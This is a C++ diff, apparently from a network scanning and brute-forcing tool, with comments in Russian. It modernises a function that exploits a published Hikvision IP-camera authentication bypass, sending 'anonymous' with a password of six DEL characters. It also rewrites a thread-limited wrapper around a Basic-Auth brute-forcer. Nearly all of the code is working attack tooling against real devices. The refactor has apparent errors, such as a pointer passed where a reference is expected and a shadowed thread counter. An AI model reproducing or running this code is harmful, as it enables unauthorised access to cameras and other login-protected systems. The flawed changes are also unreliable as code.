@@ -38,29 +38,62 @@ int BA::checkOutput(const string& buffer, const char* ip, const int port) {
 }
 
 //http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities 2
-inline bool commenceHikvisionEx1(const char *ip, const int port, bool digestMode) {
-	std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");
+inline bool commenceHikvisionEx1(std::string_view ip, int port, bool digestMode) {
+    if (!validateIP(ip) || port <= 0 || port > 65535) {
+        return false;
+    }
 
-	string buffer;
-	Connector con;
-	int res = con.nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
-	if (res > 0) {
-		if (BA::checkOutput(&buffer, ip, port) == 1) return 1;
-	}
-	return 0;
+    constexpr char DELCHAR = '\177';
+    constexpr size_t PASSWORD_LENGTH = 6;
+
+    std::string lpString = "anonymous:" + std::string(PASSWORD_LENGTH, DELCHAR);
+
+    std::string buffer;
+    Connector con;
+    
+    try {
+        int res = con.nConnect(ip.data(), port, &buffer, nullptr, nullptr, &lpString, digestMode);
+        if (res > 0) {
+            return BA::checkOutput(&buffer, ip.data(), port) == 1;
+        }
+    } catch (const std::exception& e) {
+        // Логирование ошибки
+        return false;
+    }
+
+    return false;
 }
 
-std::string getLocation(const std::string *buff) {
-	std::string buffLower = *buff;
-	std::transform(buffLower.begin(), buffLower.end(), buffLower.begin(), ::tolower);
-	int pos1 = buffLower.find("location: ");
+std::string getLocation(const std::string_view& buff) {
+    // Константа для поиска, вычисляемая на этапе компиляции
+    constexpr std::string_view LOCATION_PREFIX = "location: ";
 
-	if (-1 != pos1) {
-		std::string location = buff->substr(pos1 + 10, buff->find("\r\n", pos1) - pos1 - 10);
-		return location;
-	}
+    // Функция для сравнения символов без учета регистра
+    auto caseInsensitiveCompare = [](char a, char b) {
+        return std::tolower(static_cast<unsigned char>(a)) == 
+               std::tolower(static_cast<unsigned char>(b));
+    };
 
-	return "";
+    // Поиск подстроки "location: " без учета регистра
+    auto it = std::search(
+        buff.begin(), buff.end(),
+        LOCATION_PREFIX.begin(), LOCATION_PREFIX.end(),
+        caseInsensitiveCompare
+    );
+
+    // Если подстрока найдена
+    if (it != buff.end()) {
+        // Начало значения location
+        auto valueStart = it + LOCATION_PREFIX.length();
+        // Поиск конца строки (символ новой строки)
+        auto valueEnd = std::find(valueStart, buff.end(), '\r');
+        
+        // Возвращаем найденное значение
+        return std::string(valueStart, valueEnd);
+    }
+
+    // Если подстрока не найдена, возвращаем пустую строку
+    return "";
 }
 
 void setNewIP(const char *ipOrig, char *ip, std::string *buff, int size) {
@@ -233,20 +266,23 @@ lopaStr BA::BABrute(const char *ipOrig, const int port, bool performDoubleCheck)
     return lps;
 }
 
-lopaStr BA::BALobby(const char *ip, const int port, bool performDoubleCheck) {
-    if(gMaxBrutingThreads > 0) {
+lopaStr BA::BALobby(const std::string& ip, int port, bool performDoubleCheck) {
+    static std::atomic<int> BrutingThrds(0);
+    
+    if (gMaxBrutingThreads > 0) {
+        while (BrutingThrds >= gMaxBrutingThreads) {
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        }
 
-        while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);
-
-		++baCount;
-		++BrutingThrds;
-		stt->doEmitionUpdateArc(gTargets);
-		const lopaStr &lps = BABrute(ip, port, performDoubleCheck);
-		--BrutingThrds;
-
+        ++baCount;
+        ++BrutingThrds;
+        stt->doEmitionUpdateArc(gTargets);
+        
+        lopaStr lps = BABrute(ip.c_str(), port, performDoubleCheck);
+        
+        --BrutingThrds;
         return lps;
     } else {
-        lopaStr lps = {"UNKNOWN", "", ""};
-        return lps;
+        return {"UNKNOWN", "", ""};
     }
 }
